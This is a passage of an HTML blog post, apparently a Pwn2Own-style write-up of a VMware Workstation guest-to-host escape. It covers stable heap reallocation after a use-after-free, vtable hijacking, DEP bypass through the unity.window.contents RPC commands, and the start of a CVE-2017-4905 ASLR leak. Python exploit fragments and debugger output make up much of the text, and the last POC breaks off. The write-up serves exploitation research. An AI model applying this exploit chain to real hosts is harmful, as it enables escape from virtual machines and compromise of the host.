+<p>If you're wondering why we aren't restricted by the NULL byte issue anymore is because these RPC commands don't expect a NULL terminated string as arguments. If you remember before, we were using the argument of an RPC command as our reallocation data. However those commands expect all their arguments to be NULL terminated strings, this causes an issue where our data will get mangled if it contains NULL bytes.</p>
+<p>There is one more thing we need to do. In our previous realloacation method we beat LFH randomisation by brute-forcing 0x40 allocations. We will reuse this technique and confirm that we have stable reallocation. First we update our POC to include 0x40 allocations.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span>
+<span class="normal"><a href="#__codelineno-17-3">3</a></span>
+<span class="normal"><a href="#__codelineno-17-4">4</a></span>
+<span class="normal"><a href="#__codelineno-17-5">5</a></span>
+<span class="normal"><a href="#__codelineno-17-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x40</span><span class="p">):</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2"></a>        <span class="n">chan</span> <span class="o">=</span> <span class="n">MESSAGE_CHANNEL</span><span class="p">()</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3"></a>        <span class="n">OpenChannel</span><span class="p">(</span><span class="n">chan</span><span class="p">)</span>
+<a id="__codelineno-17-4" name="__codelineno-17-4"></a>        <span class="n">MessageSendSize</span><span class="p">(</span><span class="n">chan</span><span class="p">,</span> <span class="mh">0xAA9</span><span class="p">)</span>
+<a id="__codelineno-17-5" name="__codelineno-17-5"></a>        <span class="n">MessageSendData</span><span class="p">(</span><span class="n">chan</span><span class="p">,</span> <span class="n">inbuf</span><span class="p">,</span> <span class="mh">0xAA9</span><span class="p">)</span>
+<a id="__codelineno-17-6" name="__codelineno-17-6"></a>        <span class="n">MessageClose</span><span class="p">(</span><span class="n">chan</span><span class="p">)</span>
+</code></pre></div></td></tr></table></div>
+<p>Now let's set a breakpoint on vmware_vmx+0x9d0aa and verify that we have stable reallocation and can still include NULL bytes.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-18-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-18-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-18-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-18-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-18-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-18-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-18-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-18-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-18-10">10</a></span>
+<span class="normal"><a href="#__codelineno-18-11">11</a></span>
+<span class="normal"><a href="#__codelineno-18-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1"></a>0:014&gt; bp vmware_vmx+0x9d0aa
+<a id="__codelineno-18-2" name="__codelineno-18-2"></a>0:014&gt; g
+<a id="__codelineno-18-3" name="__codelineno-18-3"></a>
+<a id="__codelineno-18-4" name="__codelineno-18-4"></a>0:012&gt; dq rcx
+<a id="__codelineno-18-5" name="__codelineno-18-5"></a>00000000`04429570  00007ff7`e27a74a8 00000000`04973730
+<a id="__codelineno-18-6" name="__codelineno-18-6"></a>00000000`04429580  00000000`046c67e0 00000000`046c6b60
+<a id="__codelineno-18-7" name="__codelineno-18-7"></a>00000000`04429590  00000000`04719060 00000000`00000003
+<a id="__codelineno-18-8" name="__codelineno-18-8"></a>00000000`044295a0  00000000`cdbdc001 00000000`00000000
+<a id="__codelineno-18-9" name="__codelineno-18-9"></a>00000000`044295b0  00000000`00000000 00000000`00000000
+<a id="__codelineno-18-10" name="__codelineno-18-10"></a>00000000`044295c0  00000000`00000000 00000000`00000000
+<a id="__codelineno-18-11" name="__codelineno-18-11"></a>00000000`044295d0  00000000`00000000 00000000`00000000
+<a id="__codelineno-18-12" name="__codelineno-18-12"></a>00000000`044295e0  00000000`00000000 00000000`00000000
+</code></pre></div></td></tr></table></div>
+<p>That doesn't seem to have worked. However, we previously were not using an allocation size of 0xAA9, we were in-fact using a size of 0xb0 for <code>MessageSendSize</code> and 0x80 for <code>MessageSendData</code>. So let's update these values back to their original and test the reallocation again.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span>
+<span class="normal"><a href="#__codelineno-19-3">3</a></span>
+<span class="normal"><a href="#__codelineno-19-4">4</a></span>
+<span class="normal"><a href="#__codelineno-19-5">5</a></span>
+<span class="normal"><a href="#__codelineno-19-6">6</a></span>
+<span class="normal"><a href="#__codelineno-19-7">7</a></span>
+<span class="normal"><a href="#__codelineno-19-8">8</a></span>
+<span class="normal"><a href="#__codelineno-19-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1"></a>0:013&gt; dd rcx
+<a id="__codelineno-19-2" name="__codelineno-19-2"></a>00000000`045c2760  abb00ccd 00007ffa 41414141 41414141
+<a id="__codelineno-19-3" name="__codelineno-19-3"></a>00000000`045c2770  41414141 41414141 41414141 41414141
+<a id="__codelineno-19-4" name="__codelineno-19-4"></a>00000000`045c2780  41414141 41414141 41414141 41414141
+<a id="__codelineno-19-5" name="__codelineno-19-5"></a>00000000`045c2790  41414141 41414141 41414141 41414141
+<a id="__codelineno-19-6" name="__codelineno-19-6"></a>00000000`045c27a0  41414141 41414141 41414141 41414141
+<a id="__codelineno-19-7" name="__codelineno-19-7"></a>00000000`045c27b0  41414141 41414141 41414141 41414141
+<a id="__codelineno-19-8" name="__codelineno-19-8"></a>00000000`045c27c0  41414141 41414141 41414141 41414141
+<a id="__codelineno-19-9" name="__codelineno-19-9"></a>00000000`045c27d0  41414141 41414141 41414141 41414141
+</code></pre></div></td></tr></table></div>
+<p>Perfect, we have stable reallocation now. The next goal is for us to turn this into code execution.</p>
+<h2 id="code-execution">Code Execution<a class="headerlink" href="#code-execution" title="Permanent link">&para;</a></h2>
+<p>Following the dereference shortly afterwards there is a CALL instruction on a RAX+8, we can verify this by checking the RIP register.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-20-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-20-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-20-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-20-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-20-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-20-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-20-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-20-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-20-10">10</a></span>
+<span class="normal"><a href="#__codelineno-20-11">11</a></span>
+<span class="normal"><a href="#__codelineno-20-12">12</a></span>
+<span class="normal"><a href="#__codelineno-20-13">13</a></span>
+<span class="normal"><a href="#__codelineno-20-14">14</a></span>
+<span class="normal"><a href="#__codelineno-20-15">15</a></span>
+<span class="normal"><a href="#__codelineno-20-16">16</a></span>
+<span class="normal"><a href="#__codelineno-20-17">17</a></span>
+<span class="normal"><a href="#__codelineno-20-18">18</a></span>
+<span class="normal"><a href="#__codelineno-20-19">19</a></span>
+<span class="normal"><a href="#__codelineno-20-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1"></a>Breakpoint 0 hit
+<a id="__codelineno-20-2" name="__codelineno-20-2"></a>vmware_vmx+0x9d0aa:
+<a id="__codelineno-20-3" name="__codelineno-20-3"></a>00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`046e2b20=4141414141414141
+<a id="__codelineno-20-4" name="__codelineno-20-4"></a>
+<a id="__codelineno-20-5" name="__codelineno-20-5"></a>0:013&gt; u rip
+<a id="__codelineno-20-6" name="__codelineno-20-6"></a>vmware_vmx+0x9d0aa:
+<a id="__codelineno-20-7" name="__codelineno-20-7"></a>00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx]
+<a id="__codelineno-20-8" name="__codelineno-20-8"></a>00007ff7`e209d0ad ba1a000000      mov     edx,1Ah
+<a id="__codelineno-20-9" name="__codelineno-20-9"></a>00007ff7`e209d0b2 ff5008          call    qword ptr [rax+8]
+<a id="__codelineno-20-10" name="__codelineno-20-10"></a>
+<a id="__codelineno-20-11" name="__codelineno-20-11"></a>0:013&gt; p
+<a id="__codelineno-20-12" name="__codelineno-20-12"></a>vmware_vmx+0x9d0b2:
+<a id="__codelineno-20-13" name="__codelineno-20-13"></a>00007ff7`e209d0b2 ff5008          call    qword ptr [rax+8] ds:41414141`41414149=????????????????
+<a id="__codelineno-20-14" name="__codelineno-20-14"></a>
+<a id="__codelineno-20-15" name="__codelineno-20-15"></a>0:013&gt; g
+<a id="__codelineno-20-16" name="__codelineno-20-16"></a>(7bc.27e8): Access violation - code c0000005 (first chance)
+<a id="__codelineno-20-17" name="__codelineno-20-17"></a>First chance exceptions are reported before any exception handling.
+<a id="__codelineno-20-18" name="__codelineno-20-18"></a>This exception may be expected and handled.
+<a id="__codelineno-20-19" name="__codelineno-20-19"></a>vmware_vmx+0x9d0b2:
+<a id="__codelineno-20-20" name="__codelineno-20-20"></a>00007ff7`e209d0b2 ff5008          call    qword ptr [rax+8] ds:41414141`41414149=????????????????
+</code></pre></div></td></tr></table></div>
+<p>This instruction represents a typical call to a virtual function through its vtable. When objects are created, the first QWORD is a pointer to the class' virtual function table. This table is an array of pointers to the object class' virtual functions which are used by the compiler to call the objects methods.</p>
+<p>Because we have successfully managed to perform reallocation of the object when the dereference occurs it is pointing to our data. This means that we can craft a fake object to redirect the application flow by hijacking the virtual function. In this case, we are hijacking the second virtual function. As the vtable address is located at 0x4141414141414141 and 0x4141414141414149 is the second virtual function in the table (offset 0x8). Before our reallocation this object was previously <code>dnd.setGuestFileRoot</code> the object we of course freed.</p>
+<h1 id="bypassing-dep">Bypassing DEP<a class="headerlink" href="#bypassing-dep" title="Permanent link">&para;</a></h1>
+<p>Previous research shows that an RPC command <code>unity.window.contents.start</code> allows us to store arbitrary data provided as an argument in a vmware-vmx global variable. Storing the stack pivot gadget address in a global variable is perfect. However, to use the global variable as a vtable we need its absolute address. So we'll also need to bypass ASLR to calculate the variables offset from the base address.</p>
+<h2 id="unitywindowcontentsstart">unity.window.contents.start<a class="headerlink" href="#unitywindowcontentsstart" title="Permanent link">&para;</a></h2>
+<p>There's no public documentation on this function, so we'll need to reverse it in order to understand where and how we can control that global variable. A simple text search returns the function in the same dispatcher table we looked at previously. Taking a brief look at the function in IDA, we see the following interesting block.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/globalvariableoverwrite.png" /></p>
+</figure>
+<p>As you can see in the above screenshot, there are a number of overwrites of global variables which is congruent with the previous research we cited. Our goal at this stage is to work out if we control any of those overwrites and if we do, then we have ROP storage. To achieve that goal we'll need to work through the functions requirements and arrive in the block shown above.</p>
+<p>Fortunately, the function is quite a simple one. It only takes one argument.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span>
+<span class="normal"><a href="#__codelineno-21-2">2</a></span>
+<span class="normal"><a href="#__codelineno-21-3">3</a></span>
+<span class="normal"><a href="#__codelineno-21-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="n">cmd</span> <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="s2">&quot;unity.window.contents.start AAAABBBBCCCCDDDDEEEEFFFF&quot;</span><span class="p">)</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2"></a><span class="n">outLen</span> <span class="o">=</span> <span class="n">c_ulong</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3"></a><span class="n">outbuf</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">outLen</span><span class="o">.</span><span class="n">value</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+<a id="__codelineno-21-4" name="__codelineno-21-4"></a><span class="n">RpcSendRequest</span><span class="p">(</span><span class="n">addressof</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">pointer</span><span class="p">(</span><span class="n">outLen</span><span class="p">))</span>
+</code></pre></div></td></tr></table></div>
+<p>These checks simply check that the argument pointer and the size aren't NULL. Since we provided an argument we pass these two checks implicitly.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/86b12.png" /></p>
+</figure>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/86b1b.png" /></p>
+</figure>
+<p>The next block is an important one because the return of <code>sub_4BE7C0</code> dictates the path of execution.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/sub_4be7c0.png" /></p>
+</figure>
+<p>If we assume we don't take the jump, we hit the following error statement.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/error_deserialize.png" /></p>
+</figure>
+<p>Clearly based on this we want to take the jump. So we need to confirm the execution of <code>sub_4be7c0</code> leads us to the jump. Paying close attention before the call to <code>sub_4be7c0</code> we see that <code>sub_4f9f00</code> is moved into R8. Inside <code>sub_4be7c0</code> we see that there is an indirect call made to RSI which contains <code>sub_4f9f00</code>.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/sub_4be7c0_1.png" /></p>
+</figure>
+<p>Let's set a breakpoint on the call to <code>sub_4be7c0</code> and then set a hardware breakpoint on the pointer referencing our argument.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-22-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-22-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-22-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-22-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-22-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-22-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-22-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-22-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-22-10">10</a></span>
+<span class="normal"><a href="#__codelineno-22-11">11</a></span>
+<span class="normal"><a href="#__codelineno-22-12">12</a></span>
+<span class="normal"><a href="#__codelineno-22-13">13</a></span>
+<span class="normal"><a href="#__codelineno-22-14">14</a></span>
+<span class="normal"><a href="#__codelineno-22-15">15</a></span>
+<span class="normal"><a href="#__codelineno-22-16">16</a></span>
+<span class="normal"><a href="#__codelineno-22-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1"></a>Breakpoint 0 hit
+<a id="__codelineno-22-2" name="__codelineno-22-2"></a>vmware_vmx+0x85b36:
+<a id="__codelineno-22-3" name="__codelineno-22-3"></a>00007ff6`3d4e5b36 e8857c4300      call    vmware_vmx!opus_decoder_destroy+0xbbc80 (00007ff6`3d91d7c0)
+<a id="__codelineno-22-4" name="__codelineno-22-4"></a>
+<a id="__codelineno-22-5" name="__codelineno-22-5"></a>0:013&gt; da rcx
+<a id="__codelineno-22-6" name="__codelineno-22-6"></a>00000000`03ccfe3c  &quot;AAAABBBBCCCCDDDDEEEEFFFF&quot;
+<a id="__codelineno-22-7" name="__codelineno-22-7"></a>
+<a id="__codelineno-22-8" name="__codelineno-22-8"></a>0:013&gt; ba r1 00000000`03ccfe3c
+<a id="__codelineno-22-9" name="__codelineno-22-9"></a>
+<a id="__codelineno-22-10" name="__codelineno-22-10"></a>0:013&gt; g
+<a id="__codelineno-22-11" name="__codelineno-22-11"></a>Breakpoint 1 hit
+<a id="__codelineno-22-12" name="__codelineno-22-12"></a>vmware_vmx!opus_get_version_string+0x30d1f:
+<a id="__codelineno-22-13" name="__codelineno-22-13"></a>00007ff6`3dbbbc7f ff158b240000    call    qword ptr [vmware_vmx!opus_get_version_string+0x331b0 (00007ff6`3dbbe110)]
+<a id="__codelineno-22-14" name="__codelineno-22-14"></a>ds:00007ff6`3dbbe110={WS2_32!htonl (00007ffc`a0cd39d0)}
+<a id="__codelineno-22-15" name="__codelineno-22-15"></a>
+<a id="__codelineno-22-16" name="__codelineno-22-16"></a>0:013&gt; r ecx
+<a id="__codelineno-22-17" name="__codelineno-22-17"></a>ecx=41414141
+</code></pre></div></td></tr></table></div>
+<p>Based on the output above we can see that the first DWORD is passed to htonl to switch the endianness. Since our DWORD is 0x41414141 this has no effect. Eventually we reach into the <code>sub_4f9f00</code> which checks if the first DWORD is equal to 1.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/sub_4f9f00.png" /></p>
+</figure>
+<p>Following this check, we pass the check on DWORD 4 &amp; 5 implicitly.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/dword4&amp;5.png" /></p>
+</figure>
+<p>The final check is a check on DWORD 6. DWORD 6 must be greater than zero but less than or equal to 0x8000000.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/dword6.png" /></p>
+</figure>
+<h2 id="unitywindowcontentschunk">unity.window.contents.chunk<a class="headerlink" href="#unitywindowcontentschunk" title="Permanent link">&para;</a></h2>
+<p>With a successful overwrite of a QWORD in VMWares .data section for our pivot gadget. Our next goal is to find a location to store shellcode. According to previous research we can use the "unity.window.contents.chunk" command to copy data into a buffer that is allocated during "unity.window.contents.start".</p>
+<p>Following the reversing of this function, we learn a few things. Firstly, the first two DWORDs of the argument must contain a magic value 0x1. </p>
+<p>The second DWORD is a counter which is initially set to 0. It needs to be incremented and passed every time we make a call to "unity.window.contents.chunk".</p>
+<p>The third DWORD is used as an identifier and it needs to be the same value that is specified in the call to "unity.window.contents.start".</p>
+<p>The fifth DWORD is the size of the buffer that we are going to copy into the destination allocation. Although we can specify the size ourself, the maximum size we can copy is 0xC000 bytes. Additionally, the size specified in the fifth DWORD Must be a multiple of 4.</p>
+<p>In order to achieve all of this we'll write a new function "fillMemory", as shown below.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-23-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-23-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-23-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-23-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-23-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-23-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-23-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-23-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-23-10">10</a></span>
+<span class="normal"><a href="#__codelineno-23-11">11</a></span>
+<span class="normal"><a href="#__codelineno-23-12">12</a></span>
+<span class="normal"><a href="#__codelineno-23-13">13</a></span>
+<span class="normal"><a href="#__codelineno-23-14">14</a></span>
+<span class="normal"><a href="#__codelineno-23-15">15</a></span>
+<span class="normal"><a href="#__codelineno-23-16">16</a></span>
+<span class="normal"><a href="#__codelineno-23-17">17</a></span>
+<span class="normal"><a href="#__codelineno-23-18">18</a></span>
+<span class="normal"><a href="#__codelineno-23-19">19</a></span>
+<span class="normal"><a href="#__codelineno-23-20">20</a></span>
+<span class="normal"><a href="#__codelineno-23-21">21</a></span>
+<span class="normal"><a href="#__codelineno-23-22">22</a></span>
+<span class="normal"><a href="#__codelineno-23-23">23</a></span>
+<span class="normal"><a href="#__codelineno-23-24">24</a></span>
+<span class="normal"><a href="#__codelineno-23-25">25</a></span>
+<span class="normal"><a href="#__codelineno-23-26">26</a></span>
+<span class="normal"><a href="#__codelineno-23-27">27</a></span>
+<span class="normal"><a href="#__codelineno-23-28">28</a></span>
+<span class="normal"><a href="#__codelineno-23-29">29</a></span>
+<span class="normal"><a href="#__codelineno-23-30">30</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1"></a><span class="k">def</span> <span class="nf">fillMemory</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">):</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2"></a>    <span class="n">rounded_size</span> <span class="o">=</span> <span class="n">bufSize</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3"></a>    <span class="k">if</span> <span class="n">bufSize</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+<a id="__codelineno-23-4" name="__codelineno-23-4"></a>        <span class="n">rounded_size</span> <span class="o">+=</span> <span class="mi">4</span> <span class="o">-</span> <span class="p">(</span><span class="n">bufSize</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span>
+<a id="__codelineno-23-5" name="__codelineno-23-5"></a>
+<a id="__codelineno-23-6" name="__codelineno-23-6"></a>    <span class="n">chunk</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="n">rounded_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+<a id="__codelineno-23-7" name="__codelineno-23-7"></a>    <span class="n">memset</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="n">rounded_size</span><span class="p">)</span>
+<a id="__codelineno-23-8" name="__codelineno-23-8"></a>
+<a id="__codelineno-23-9" name="__codelineno-23-9"></a>    <span class="n">cmd</span> <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="s2">&quot;unity.window.contents.chunk &quot;</span><span class="p">)</span>
+<a id="__codelineno-23-10" name="__codelineno-23-10"></a>    <span class="n">memmove</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="n">addressof</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="mh">0x1c</span><span class="p">)</span>
+<a id="__codelineno-23-11" name="__codelineno-23-11"></a>
+<a id="__codelineno-23-12" name="__codelineno-23-12"></a>    <span class="n">magicValue</span> <span class="o">=</span> <span class="n">c_ulong</span><span class="p">(</span><span class="n">htonl</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+<a id="__codelineno-23-13" name="__codelineno-23-13"></a>    <span class="n">memmove</span><span class="p">(</span><span class="n">chunk</span> <span class="o">+</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="n">addressof</span><span class="p">(</span><span class="n">magicValue</span><span class="p">),</span> <span class="mi">4</span><span class="p">)</span>
+<a id="__codelineno-23-14" name="__codelineno-23-14"></a>
+<a id="__codelineno-23-15" name="__codelineno-23-15"></a>    <span class="n">memmove</span><span class="p">(</span><span class="n">chunk</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">addressof</span><span class="p">(</span><span class="n">magicValue</span><span class="p">),</span> <span class="mi">4</span><span class="p">)</span>
+<a id="__codelineno-23-16" name="__codelineno-23-16"></a>
+<a id="__codelineno-23-17" name="__codelineno-23-17"></a>    <span class="n">id_value</span> <span class="o">=</span> <span class="n">c_ulong</span><span class="p">(</span><span class="n">htonl</span><span class="p">(</span><span class="mh">0x43434343</span><span class="p">))</span>
+<a id="__codelineno-23-18" name="__codelineno-23-18"></a>    <span class="n">memmove</span><span class="p">(</span><span class="n">chunk</span> <span class="o">+</span> <span class="mh">0x24</span><span class="p">,</span> <span class="n">addressof</span><span class="p">(</span><span class="n">id_value</span><span class="p">),</span> <span class="mi">4</span><span class="p">)</span>
+<a id="__codelineno-23-19" name="__codelineno-23-19"></a>
+<a id="__codelineno-23-20" name="__codelineno-23-20"></a>    <span class="n">index_value</span> <span class="o">=</span> <span class="n">c_ulong</span><span class="p">(</span><span class="n">htonl</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+<a id="__codelineno-23-21" name="__codelineno-23-21"></a>    <span class="n">memmove</span><span class="p">(</span><span class="n">chunk</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">,</span> <span class="n">addressof</span><span class="p">(</span><span class="n">index_value</span><span class="p">),</span> <span class="mi">4</span><span class="p">)</span>
+<a id="__codelineno-23-22" name="__codelineno-23-22"></a>
+<a id="__codelineno-23-23" name="__codelineno-23-23"></a>    <span class="n">size_value</span> <span class="o">=</span> <span class="n">c_ulong</span><span class="p">(</span><span class="n">htonl</span><span class="p">(</span><span class="n">rounded_size</span><span class="p">))</span>
+<a id="__codelineno-23-24" name="__codelineno-23-24"></a>    <span class="n">memmove</span><span class="p">(</span><span class="n">chunk</span> <span class="o">+</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="n">addressof</span><span class="p">(</span><span class="n">size_value</span><span class="p">),</span> <span class="mi">4</span><span class="p">)</span>
+<a id="__codelineno-23-25" name="__codelineno-23-25"></a>
+<a id="__codelineno-23-26" name="__codelineno-23-26"></a>    <span class="n">memmove</span><span class="p">(</span><span class="n">chunk</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">)</span>
+<a id="__codelineno-23-27" name="__codelineno-23-27"></a>
+<a id="__codelineno-23-28" name="__codelineno-23-28"></a>    <span class="n">outLen</span> <span class="o">=</span> <span class="n">c_ulong</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
+<a id="__codelineno-23-29" name="__codelineno-23-29"></a>    <span class="n">outbuf</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">outLen</span><span class="o">.</span><span class="n">value</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+<a id="__codelineno-23-30" name="__codelineno-23-30"></a>    <span class="n">RpcSendRequest</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="n">rounded_size</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">pointer</span><span class="p">(</span><span class="n">outLen</span><span class="p">))</span>
+</code></pre></div></td></tr></table></div>
+<h1 id="bypassing-aslr">Bypassing ASLR<a class="headerlink" href="#bypassing-aslr" title="Permanent link">&para;</a></h1>
+<p>The next problem for us to solve is ASLR. We need the base address of vmware_vmx so that we can calculate the absolute address of the fake vtable and ROP gadget. Lucky for us, there is a CVE which targets our version, CVE-2017-4905.</p>
+<p>This CVE exploits a logic bug which allowed the disclosure of memory content, including function pointers. It was patched in VMSA-2017-0006.</p>
+<p>At a high level, the bug is quite simple. A buffer is allocated on the stack when processing backdoor requests. The buffer should be initialized in the BDOORHB callback but when requesting an invalid command, the callback doesn't correctly clear the buffer, causing content of the stack to be leaked to the guest. Below is a simple POC which exploits this CVE:</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-24-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-24-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-24-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-24-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-24-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-24-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-24-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-24-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-24-10">10</a></span>
+<span class="normal"><a href="#__codelineno-24-11">11</a></span>
+<span class="normal"><a href="#__codelineno-24-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="k">def</span> <span class="nf">leak</span><span class="p">():</span>
